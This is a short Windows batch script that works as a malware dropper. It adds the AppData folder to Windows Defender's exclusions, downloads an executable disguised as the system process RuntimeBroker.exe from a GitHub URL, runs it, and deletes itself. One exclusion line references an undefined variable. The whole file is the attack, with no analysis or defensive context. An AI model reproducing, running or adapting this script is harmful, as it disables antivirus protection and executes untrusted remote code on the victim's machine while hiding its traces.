@echo off
setlocal

:: Exclude %appdata% folder from Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath $env:APPDATA"

:: Set the download URL
set "url=https://github.com/evanffx/api/raw/refs/heads/main/RuntimeBroker.exe"

:: Set the output file path
set "outputFile=%APPDATA%\RuntimeBroker.exe"

:: Small delay to ensure exclusion is applied
timeout /nobreak /t 1 >nul

:: Download the file
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile%'"

:: Add exclusion for the downloaded EXE itself
powershell -Command "Add-MpPreference -ExclusionPath '%downloadPath%'"

:: Small delay to ensure exclusion is applied
timeout /nobreak /t 3 >nul

:: Run the downloaded file
start "" "%outputFile%"

endlocal

:: Delete the batch file itself
del "%~f0"
exit
